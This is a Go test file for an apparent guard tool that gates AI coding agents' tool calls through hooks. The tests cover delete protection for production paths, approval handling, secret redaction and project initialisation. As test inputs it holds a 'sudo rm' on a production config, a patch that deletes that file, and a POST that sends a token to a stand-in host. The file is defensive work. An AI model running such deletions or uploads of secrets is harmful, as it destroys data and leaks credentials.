		t.Fatalf("create project config directory: %v", err)
	}
	protected := `{
		"version":1,
		"localActionFirewall":{
			"enabled":true,
			"protectedPaths":[{"pattern":"deploy/production/**","delete":"deny","reason":"生产配置目录"}],
			"egress":{"enabled":false}
		}
	}`
	if err := os.WriteFile(projectProtectedPath(repo), []byte(protected), 0o600); err != nil {
		t.Fatalf("write project protection: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	patch := "*** Begin Patch\n*** Delete File: deploy/production/app.yaml\n*** End Patch\n"
	inputPath := writeHookPayloadForRepo(t, repo, "apply_patch", map[string]any{"command": patch})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "stale backend allow"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	var result guard.CodexHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode codex hook output: %v output=%s", err, stdout.String())
	}
	if result.HookSpecificOutput.PermissionDecision != "deny" || !strings.Contains(result.HookSpecificOutput.PermissionDecisionReason, "生产配置目录") {
		t.Fatalf("patch delete target must use the project delete rule, got %+v", result)
	}
}

func TestRunGuardHookCodexProjectProtectionExtractsWrappedDeleteTarget(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project config directory: %v", err)
	}
	protected := `{
		"version":1,
		"localActionFirewall":{
			"enabled":true,
			"protectedPaths":[{"pattern":"deploy/production/**","delete":"deny","reason":"生产配置目录"}],
			"egress":{"enabled":false}
		}
	}`
	if err := os.WriteFile(projectProtectedPath(repo), []byte(protected), 0o600); err != nil {
		t.Fatalf("write project protection: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{
		"command": "sudo rm deploy/production/app.yaml",
	})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "stale backend allow"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	var result guard.CodexHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode codex hook output: %v output=%s", err, stdout.String())
	}
	if result.HookSpecificOutput.PermissionDecision != "deny" || !strings.Contains(result.HookSpecificOutput.PermissionDecisionReason, "生产配置目录") {
		t.Fatalf("wrapped delete target must be governed by the project rule, got %+v", result)
	}
}

func TestRunGuardHookCodexAsksBecomeDenyAndSupportsStdin(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	payload, err := json.Marshal(map[string]any{
		"cwd":       repo,
		"tool_name": "network.request",
		"tool_input": map[string]any{
			"method": "POST",
			"url":    "https://example.test/upload",
		},
	})
	if err != nil {
		t.Fatalf("marshal payload: %v", err)
	}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{
			"decision":       "deny_with_ticket",
			"reason":         "approval required",
			"approvalId":     "approval-test-ask",
			"approvalStatus": "pending",
			"fingerprint":    "fingerprint-test-ask",
		})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	oldStdin := os.Stdin
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatalf("create stdin pipe: %v", err)
	}
	t.Cleanup(func() {
		os.Stdin = oldStdin
		reader.Close()
	})
	os.Stdin = reader
	if _, err := writer.Write(payload); err != nil {
		t.Fatalf("write stdin payload: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close stdin writer: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", "-"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook codex stdin returned %d stderr=%s", code, stderr.String())
	}
	var result guard.CodexHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode codex hook output: %v output=%s", err, stdout.String())
	}
	if result.HookSpecificOutput.PermissionDecision != "deny" || !strings.Contains(result.HookSpecificOutput.PermissionDecisionReason, "approval required") {
		t.Fatalf("expected ask-to-deny codex output, got %+v", result)
	}
}

func TestEnforceHookDecisionFloorAllowsRememberedApproval(t *testing.T) {
	local := guard.Decision{
		Decision:  "ask",
		RiskLevel: "medium",
		Reason:    "Guard Core requires confirmation",
	}
	backend := hookAgentGuardResponse{
		Decision:       "allow",
		ApprovalID:     "approval-remembered",
		ApprovalStatus: "consumed",
		Fingerprint:    "fingerprint-remembered",
	}

	got := enforceHookDecisionFloor(local, hookAgentGuardRequest{}, backend)
	if got.Decision != "allow" {
		t.Fatalf("remembered approval should bypass the local ask floor, got %+v", got)
	}
}

func TestEnforceHookDecisionFloorRejectsUnbackedAllow(t *testing.T) {
	local := guard.Decision{
		Decision:  "ask",
		RiskLevel: "medium",
		Reason:    "Guard Core requires confirmation",
	}
	backend := hookAgentGuardResponse{Decision: "allow"}

	got := enforceHookDecisionFloor(local, hookAgentGuardRequest{}, backend)
	if got.Decision != "deny" {
		t.Fatalf("unbacked backend allow must remain denied, got %+v", got)
	}
}

func TestProjectHookMatcherIncludesDirectNetworkTools(t *testing.T) {
	for _, tool := range []string{"http.request", "network.request"} {
		matched, err := regexp.MatchString(localActionHookMatcher, tool)
		if err != nil {
			t.Fatalf("compile hook matcher: %v", err)
		}
		if !matched {
			t.Fatalf("generated hook matcher must include %s", tool)
		}
	}
}

func TestRunGuardHookCodexRejectsUnknownModeAndDoesNotLeakPayloadSecret(t *testing.T) {
	inputPath := filepath.Join(t.TempDir(), "payload.json")
	payload := []byte(`{
		"event":"pre_tool_use",
		"tool_name":"network.request",
		"cwd":"F:\\workspace\\AgentToolGate",
		"project_root":"F:\\workspace\\AgentToolGate",
		"args":{"method":"POST","url":"https://unknown.example.invalid/upload","body":"ATG_TOKEN=super-secret-token"}
	}`)
	if err := os.WriteFile(inputPath, payload, 0o600); err != nil {
		t.Fatalf("write payload: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath, "--mode", "enforce"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook codex returned %d stderr=%s", code, stderr.String())
	}
	combined := strings.ToLower(stdout.String() + stderr.String())
	for _, leaked := range []string{"super-secret-token", "atg_token", "unknown.example.invalid"} {
		if strings.Contains(combined, leaked) {
			t.Fatalf("codex hook output leaked %q: stdout=%s stderr=%s", leaked, stdout.String(), stderr.String())
		}
	}

	stdout.Reset()
	stderr.Reset()
	code = run([]string{"guard", "hook", "codex", "--input", inputPath, "--mode", "dry-run"}, &stdout, &stderr)
	if code != 2 || !strings.Contains(stderr.String(), "--mode enforce") {
		t.Fatalf("expected unknown mode error, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
}

func TestRunGuardHookClaudeDoesNotLeakPayloadSecret(t *testing.T) {
	inputPath := filepath.Join(t.TempDir(), "payload.json")
	payload := []byte(`{
		"hook_event_name":"PreToolUse",
		"tool_name":"Write",
		"cwd":"F:\\workspace\\AgentToolGate",
		"project_root":"F:\\workspace\\AgentToolGate",
		"tool_input":{"file_path":".env.local","content":"ATG_TOKEN=super-secret-token"}
	}`)
	if err := os.WriteFile(inputPath, payload, 0o600); err != nil {
		t.Fatalf("write payload: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "claude", "--input", inputPath, "--mode", "enforce"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook returned %d stderr=%s", code, stderr.String())
	}
	combined := strings.ToLower(stdout.String() + stderr.String())
	for _, leaked := range []string{"super-secret-token", "atg_token", ".env.local"} {
		if strings.Contains(combined, leaked) {
			t.Fatalf("hook output leaked %q: stdout=%s stderr=%s", leaked, stdout.String(), stderr.String())
		}
	}
}

func TestRunInitGeneratesProjectFiles(t *testing.T) {
	project := t.TempDir()
	initTestGitRepository(t, project)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"init", "--dir", project}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("init returned %d stderr=%s", code, stderr.String())
	}

	expected := []string{
		projectConfigPath(project),
		projectProtectedPath(project),
		projectReadmePath(project),
		projectPromptPath(project),
		projectCodexConfigSnippetPath(project),
		projectCodexProjectSnippetPath(project),
		projectCodexProjectConfigPath(project),
		projectCodexHookAdapterPath(project),
		projectCodexHookCorePath(project),
		projectClaudeMCPPath(project),
		projectClaudeSettingsPath(project),
	}
	for _, path := range expected {
		if _, err := os.Stat(path); err != nil {
			t.Fatalf("expected generated file %s: %v", path, err)
		}
	}
	if !strings.Contains(stdout.String(), "默认 hook mode: dry-run") {
		t.Fatalf("init output should mention dry-run default, got:\n%s", stdout.String())
	}
	wantCommand := currentAgentToolGateCommandName()
	if !strings.Contains(stdout.String(), wantCommand+" up --open") ||
		!strings.Contains(stdout.String(), ".agenttoolgate/clients/") {
		t.Fatalf("init output should guide the next client setup step with platform command %q, got:\n%s", wantCommand, stdout.String())
	}

	raw, err := os.ReadFile(projectConfigPath(project))
	if err != nil {
		t.Fatalf("read config: %v", err)
	}
	var cfg projectRunConfig
	if err := json.Unmarshal(raw, &cfg); err != nil {
		t.Fatalf("decode config: %v content=%s", err, string(raw))
	}
	if cfg.HookMode != projectHookModeDryRun || cfg.Workspace.OrgID != "local-org" || cfg.Port != 8080 {
		t.Fatalf("unexpected generated config: %+v", cfg)
	}
}

func TestProjectClientSnippetsAreCopyReady(t *testing.T) {
	project := t.TempDir()
	if _, err := writeProjectInitFiles(project, projectInitModeAll); err != nil {
		t.Fatalf("write init files: %v", err)
	}

	codexConfig, err := os.ReadFile(projectCodexConfigSnippetPath(project))
	if err != nil {
		t.Fatalf("read codex config snippet: %v", err)
	}
	codexText := string(codexConfig)
	for _, want := range []string{
		"[projects.'<repo>']",
		"[mcp_servers.agenttoolgate]",
		`url = "http://127.0.0.1:8080/mcp"`,
		`default_tools_approval_mode = "approve"`,
	} {
		if !strings.Contains(codexText, want) {
			t.Fatalf("codex config snippet missing %q:\n%s", want, codexText)
		}
	}

	claudeMCP, err := os.ReadFile(projectClaudeMCPPath(project))
	if err != nil {
		t.Fatalf("read claude mcp snippet: %v", err)
	}
	var claudeMCPDoc struct {
		MCPServers map[string]struct {
			Type    string            `json:"type"`
			URL     string            `json:"url"`
			Headers map[string]string `json:"headers"`
		} `json:"mcpServers"`
	}
	if err := json.Unmarshal(claudeMCP, &claudeMCPDoc); err != nil {
		t.Fatalf("decode claude mcp snippet: %v content=%s", err, string(claudeMCP))
	}
	agentToolGateServer, ok := claudeMCPDoc.MCPServers["agenttoolgate"]
	if !ok {
		t.Fatalf("claude mcp snippet missing agenttoolgate server:\n%s", string(claudeMCP))
	}
	if agentToolGateServer.Type != "http" || agentToolGateServer.URL != "http://127.0.0.1:8080/mcp" {
		t.Fatalf("claude mcp snippet should default to Streamable HTTP /mcp, got %+v", agentToolGateServer)
	}
	if agentToolGateServer.Headers["X-Workspace-Org-Id"] != "local-org" {
		t.Fatalf("claude mcp snippet missing workspace header: %+v", agentToolGateServer.Headers)
	}

	for _, path := range []string{projectClaudeSettingsPath(project)} {
		raw, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read snippet %s: %v", path, err)
		}
		var doc map[string]any
		if err := json.Unmarshal(raw, &doc); err != nil {
			t.Fatalf("decode snippet %s: %v content=%s", path, err, string(raw))
		}
		if _, ok := doc["note"]; ok {
			t.Fatalf("copy-ready snippet %s must not contain root note field:\n%s", path, string(raw))
		}
		if !strings.Contains(string(raw), `"matcher": "`+localActionHookMatcher+`"`) {
			t.Fatalf("hook snippet %s must use the shared action matcher:\n%s", path, string(raw))
		}
	}
	if !strings.Contains(localActionHookMatcher, "Read") {
		t.Fatalf("hook matcher must include sensitive file reads: %s", localActionHookMatcher)
	}
	for _, tool := range []string{"Grep", "Glob"} {
		if !strings.Contains(localActionHookMatcher, tool) {
			t.Fatalf("hook matcher must include %s reads: %s", tool, localActionHookMatcher)
		}
	}
	if !strings.Contains(localActionHookMatcher, "mcp__.*") {
		t.Fatalf("hook matcher must route external MCP tools through governance: %s", localActionHookMatcher)
	}
}

func TestProjectHookCommandNameIsPlatformSpecific(t *testing.T) {
	if got := agentToolGateCommandName("windows"); got != "agenttoolgate.exe" {
		t.Fatalf("windows hook command should use .exe, got %q", got)
	}
	for _, goos := range []string{"linux", "darwin"} {
		if got := agentToolGateCommandName(goos); got != "agenttoolgate" {
			t.Fatalf("%s hook command should not use .exe, got %q", goos, got)
		}
	}
}

func TestProjectHookSnippetsUseCurrentPlatformCommand(t *testing.T) {
	project := t.TempDir()
	if _, err := writeProjectInitFiles(project, projectInitModeAll); err != nil {
		t.Fatalf("write init files: %v", err)
	}
	wantCommand := currentAgentToolGateCommandName()
	for _, tc := range []struct {
		name string
		path string
		want string
	}{
		{name: "claude", path: projectClaudeSettingsPath(project), want: wantCommand + " guard hook claude --input -"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			raw, err := os.ReadFile(tc.path)
			if err != nil {
				t.Fatalf("read hook snippet: %v", err)
			}
			if !strings.Contains(string(raw), tc.want) {
				t.Fatalf("hook snippet should use platform command %q:\n%s", tc.want, string(raw))
			}
			if wantCommand == "agenttoolgate" && strings.Contains(string(raw), "agenttoolgate.exe") {
				t.Fatalf("non-windows hook snippet must not include .exe:\n%s", string(raw))
			}
		})
	}
}

func TestRunInitClientTargetsGenerateOnlyRequestedTemplates(t *testing.T) {
	t.Run("codex only", func(t *testing.T) {
		project := t.TempDir()
		initTestGitRepository(t, project)
		var stdout bytes.Buffer
		var stderr bytes.Buffer
		code := run([]string{"init", "codex", "--dir", project}, &stdout, &stderr)
		if code != 0 {
			t.Fatalf("init codex returned %d stderr=%s", code, stderr.String())
		}
		for _, path := range []string{
			projectConfigPath(project),
			projectProtectedPath(project),
			projectCodexConfigSnippetPath(project),
			projectCodexProjectSnippetPath(project),
			projectCodexProjectConfigPath(project),
			projectCodexHookAdapterPath(project),
			projectCodexHookCorePath(project),
		} {
			if _, err := os.Stat(path); err != nil {
				t.Fatalf("expected codex init file %s: %v", path, err)
			}
		}
		for _, path := range []string{projectClaudeMCPPath(project), projectClaudeSettingsPath(project)} {
			if _, err := os.Stat(path); !os.IsNotExist(err) {
				t.Fatalf("codex init must not generate claude file %s", path)
			}
		}
	})

	t.Run("claude only", func(t *testing.T) {
		project := t.TempDir()
		var stdout bytes.Buffer
		var stderr bytes.Buffer
		code := run([]string{"init", "claude", "--dir", project}, &stdout, &stderr)
		if code != 0 {
			t.Fatalf("init claude returned %d stderr=%s", code, stderr.String())
		}
		for _, path := range []string{projectConfigPath(project), projectProtectedPath(project), projectClaudeMCPPath(project), projectClaudeSettingsPath(project)} {
			if _, err := os.Stat(path); err != nil {
				t.Fatalf("expected claude init file %s: %v", path, err)
			}
		}
		for _, path := range []string{
			projectCodexConfigSnippetPath(project),
			projectCodexProjectSnippetPath(project),
			projectCodexProjectConfigPath(project),
			projectCodexHookAdapterPath(project),
			projectCodexHookCorePath(project),
		} {
			if _, err := os.Stat(path); !os.IsNotExist(err) {
				t.Fatalf("claude init must not generate codex file %s", path)
			}
		}
	})
}

func TestRunInitDoesNotOverwriteExistingFiles(t *testing.T) {
	project := t.TempDir()
	initTestGitRepository(t, project)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"init", "--dir", project}, &stdout, &stderr); code != 0 {
		t.Fatalf("initial init returned %d stderr=%s", code, stderr.String())
	}

	custom := []byte("{\"user\":\"modified\"}\n")
	if err := os.WriteFile(projectConfigPath(project), custom, 0o600); err != nil {
		t.Fatalf("modify config: %v", err)
	}
	stdout.Reset()
	stderr.Reset()
	if code := run([]string{"init", "--dir", project}, &stdout, &stderr); code != 0 {
		t.Fatalf("second init returned %d stderr=%s", code, stderr.String())
	}
	after, err := os.ReadFile(projectConfigPath(project))
	if err != nil {
		t.Fatalf("read config after second init: %v", err)
	}
	if string(after) != string(custom) {
		t.Fatalf("init must not overwrite existing config, got %s", string(after))
	}
	if !strings.Contains(stdout.String(), "已跳过") {
		t.Fatalf("second init should report skipped files, got:\n%s", stdout.String())
	}
}

func TestPrepareProjectUpDoesNotWriteHookControlBeforeStart(t *testing.T) {
	project := t.TempDir()
	if err := os.MkdirAll(filepath.Dir(projectConfigPath(project)), 0o700); err != nil {
		t.Fatalf("mkdir config dir: %v", err)
	}
	configBody := []byte(`{
  "host": "127.0.0.1",
  "port": 18081,
  "workspace": {"name":"Demo","slug":"demo","orgId":"demo-org"},
  "hookMode": "dry-run",
  "openBrowser": true
}
`)
	if err := os.WriteFile(projectConfigPath(project), configBody, 0o600); err != nil {
		t.Fatalf("write project config: %v", err)
	}
	t.Setenv("STORE_DRIVER", "memory")

	cfg, openBrowser, summary, hookControlPath, hookControlMode, err := prepareProjectUp(commandOptions{Command: "up", Dir: project, Port: "18082"})
	if err != nil {
		t.Fatalf("prepare up: %v", err)
	}
	if cfg.Port != "18082" || cfg.DefaultWorkspaceOrgID != "demo-org" || cfg.DefaultWorkspaceSlug != "demo" {
		t.Fatalf("project config not applied: %+v", cfg)
	}
	expectedRoot, err := filepath.Abs(project)
	if err != nil {
		t.Fatalf("resolve expected project root: %v", err)
	}
	if cfg.ProjectRoot != expectedRoot {
		t.Fatalf("prepare up must preserve the trusted project root, got %q want %q", cfg.ProjectRoot, expectedRoot)
	}
	if !openBrowser {
		t.Fatalf("openBrowser should follow project config")
	}
	if !strings.Contains(summary, "Hook mode: dry-run") || !strings.Contains(summary, projectConfigPath(project)) {
		t.Fatalf("up summary missing config or dry-run mode:\n%s", summary)
	}
	if !strings.Contains(summary, "Codex / Claude Code 默认使用 /mcp") || !strings.Contains(summary, ".agenttoolgate/clients/") {
		t.Fatalf("up summary missing MCP/client next steps:\n%s", summary)
	}
	if _, err := os.Stat(hookControlPath); !os.IsNotExist(err) {
		t.Fatalf("hook control should not exist before server start, got err=%v", err)
	}
	if err := writeProjectHookControlAtPath(project, hookControlPath, hookControlMode); err != nil {
		t.Fatalf("write hook control after simulated start: %v", err)
	}
	raw, err := os.ReadFile(hookControlPath)
	if err != nil {
		t.Fatalf("read hook control: %v", err)
	}
	var doc hookControlDocument
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("decode hook control: %v content=%s", err, string(raw))
	}
	if doc.Mode != projectHookModeDryRun || doc.Reason != "项目级 up" {
		t.Fatalf("unexpected hook control doc: %+v", doc)
	}
}

func TestApplyProjectRunConfigNormalizesTrustedProjectRoot(t *testing.T) {
	rawRoot := "  " + filepath.Join(t.TempDir(), "nested", "..") + "  "
	cfg := config.Config{}

	applyProjectRunConfig(&cfg, projectRunConfig{ProjectRoot: rawRoot})

	expectedRoot := filepath.Clean(strings.TrimSpace(rawRoot))
	if cfg.ProjectRoot != expectedRoot {
		t.Fatalf("project root must be trimmed and cleaned, got %q want %q", cfg.ProjectRoot, expectedRoot)
	}
}

func TestRunUpFailureRestoresPreviousHookControl(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create config dir: %v", err)
	}
	configBody := []byte(`{
  "host": "127.0.0.1",
  "port": 18081,
  "workspace": {"name":"Demo","slug":"demo","orgId":"demo-org"},
  "hookMode": "live",
  "openBrowser": false
}
`)
	if err := os.WriteFile(projectConfigPath(repo), configBody, 0o600); err != nil {
		t.Fatalf("write project config: %v", err)
	}

	oldGetwd, err := os.Getwd()
	if err != nil {
		t.Fatalf("get wd: %v", err)
	}
	t.Cleanup(func() { _ = os.Chdir(oldGetwd) })
	if err := os.Chdir(repo); err != nil {
		t.Fatalf("chdir repo: %v", err)
	}
	t.Setenv("STORE_DRIVER", "memory")

	cfg, _, _, hookControlPath, hookControlMode, err := prepareProjectUp(commandOptions{Command: "up", Dir: repo})
	if err != nil {
		t.Fatalf("prepare up: %v", err)
	}
	// 使用系统分配的临时端口，确保本测试稳定进入启动后钩子失败与清理分支。
	cfg.Port = "0"
	if err := writeProjectHookControlAtPath(repo, hookControlPath, projectHookModeOff); err != nil {
		t.Fatalf("write previous hook control: %v", err)
	}
	previous, err := os.ReadFile(hookControlPath)
	if err != nil {
		t.Fatalf("read previous hook control: %v", err)
	}
	activation := projectHookControlActivation{root: repo, path: hookControlPath, mode: hookControlMode}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := startServer(cfg, false, &stdout, &stderr,
		func() error {
			if err := activation.publish(); err != nil {
				return err
			}
			return fmt.Errorf("simulated start failure")
		},
		activation.rollback,
	)
	if code == 0 {
		t.Fatalf("expected startServer to fail on simulated hook error")
	}
	after, err := os.ReadFile(hookControlPath)
	if err != nil {
		t.Fatalf("read restored hook control: %v", err)
	}
	if !bytes.Equal(after, previous) {
		t.Fatalf("failed start must restore previous hook control\nbefore=%s\nafter=%s", previous, after)
	}

	stderr.Reset()
	code = startServer(cfg, false, &stdout, &stderr,
		func() error { return fmt.Errorf("simulated start failure") },
		func() error { return fmt.Errorf("simulated rollback failure") },
	)
	if code == 0 || !strings.Contains(stderr.String(), "hook control rollback failed: simulated rollback failure") {
		t.Fatalf("rollback failure must be visible, code=%d stderr=%s", code, stderr.String())
	}
}

func TestHookControlActivationRollbackRemovesNewControl(t *testing.T) {
	root := t.TempDir()
	path := projectHookControlPath(root)
	activation := projectHookControlActivation{root: root, path: path, mode: projectHookModeLive}
	if err := activation.publish(); err != nil {
		t.Fatalf("publish hook control: %v", err)
	}
	if err := activation.rollback(); err != nil {
		t.Fatalf("rollback hook control: %v", err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("rollback without previous control must remove the published file, got %v", err)
	}
}

func TestHookControlActivationRollbackPreservesConcurrentUpdate(t *testing.T) {
	root := t.TempDir()
	path := projectHookControlPath(root)
	if err := writeProjectHookControlAtPath(root, path, projectHookModeOff); err != nil {
		t.Fatalf("write previous hook control: %v", err)
	}
	activation := projectHookControlActivation{root: root, path: path, mode: projectHookModeLive}
	if err := activation.publish(); err != nil {
		t.Fatalf("publish hook control: %v", err)
	}
	concurrent := []byte("{\n  \"mode\": \"dry-run\",\n  \"reason\": \"concurrent update\"\n}\n")
	if err := writeProjectHookControlPayload(root, path, concurrent); err != nil {
		t.Fatalf("write concurrent hook control: %v", err)
	}
	if err := activation.rollback(); err != nil {
		t.Fatalf("rollback hook control: %v", err)
	}
	after, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read concurrent hook control: %v", err)
	}
	if !bytes.Equal(after, concurrent) {
		t.Fatalf("rollback must preserve a newer control update\nwant=%s\ngot=%s", concurrent, after)
	}
}

func TestProjectGeneratedContentDoesNotLeakSensitiveValues(t *testing.T) {
	project := t.TempDir()
	t.Setenv("GITHUB_TOKEN", "ghp_should_never_appear")
	t.Setenv("DATABASE_URL", "postgres://user:secret-password@127.0.0.1:5432/agenttoolgate")
	if _, err := writeProjectInitFiles(project, projectInitModeAll); err != nil {
		t.Fatalf("write init files: %v", err)
	}
	configPaths := []string{
		projectConfigPath(project),
		projectProtectedPath(project),
		projectReadmePath(project),
		projectPromptPath(project),
		projectCodexConfigSnippetPath(project),
		projectCodexProjectSnippetPath(project),
		projectCodexProjectConfigPath(project),
		projectClaudeMCPPath(project),
		projectClaudeSettingsPath(project),
	}
	for _, path := range configPaths {
		raw, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read generated file %s: %v", path, err)
		}
		text := strings.ToLower(string(raw))
		for _, leaked := range []string{"ghp_should_never_appear", "secret-password", "postgres://", "authorization", "e:\\workspace-new", "c:\\users"} {
			if strings.Contains(text, leaked) {
				t.Fatalf("generated file %s leaked %q:\n%s", path, leaked, string(raw))
			}
		}
	}
	for _, path := range []string{projectCodexHookAdapterPath(project), projectCodexHookCorePath(project)} {
		raw, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read generated hook %s: %v", path, err)
		}
		text := strings.ToLower(string(raw))
		for _, leaked := range []string{"ghp_should_never_appear", "secret-password", "postgres://", "e:\\workspace-new", "c:\\users"} {
			if strings.Contains(text, leaked) {
				t.Fatalf("generated hook %s leaked %q", path, leaked)
			}
		}
	}
}

func TestInitRejectsUnknownTargetWithChineseHint(t *testing.T) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"init", "banana", "--dir", t.TempDir()}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected code 2, got %d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	if !strings.Contains(stderr.String(), "init 仅支持 all、codex 或 claude") {
		t.Fatalf("expected stable Chinese init error, got %s", stderr.String())
	}
}

func TestRedactHookTargetRemovesURLUserinfoAndSensitiveQuery(t *testing.T) {
	const target = "https://user:password@example.test/path?token=secret-value&page=1#fragment"
	redacted := redactHookTarget(target)
	for _, leaked := range []string{"user", "password", "secret-value", "fragment"} {
		if strings.Contains(redacted, leaked) {
			t.Fatalf("redacted hook target leaked %q: %s", leaked, redacted)
		}
	}
	if !strings.Contains(redacted, "page=1") || !strings.Contains(redacted, "%5BREDACTED%5D") {
		t.Fatalf("redacted hook target lost safe URL structure: %s", redacted)
	}
}

func writeHookPayloadForRepo(t *testing.T, repo, toolName string, toolInput map[string]any) string {
	t.Helper()
	payload, err := json.Marshal(map[string]any{
		"cwd":        repo,
		"tool_name":  toolName,
		"tool_input": toolInput,
	})
	if err != nil {
		t.Fatalf("marshal hook payload: %v", err)
	}
	path := filepath.Join(t.TempDir(), "hook-payload.json")
	if err := os.WriteFile(path, payload, 0o600); err != nil {
		t.Fatalf("write hook payload: %v", err)
	}
	return path
}

func writeHookDecisionResponse(t *testing.T, w http.ResponseWriter, payload map[string]any) {
	t.Helper()
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		t.Fatalf("encode hook response: %v", err)
	}
}
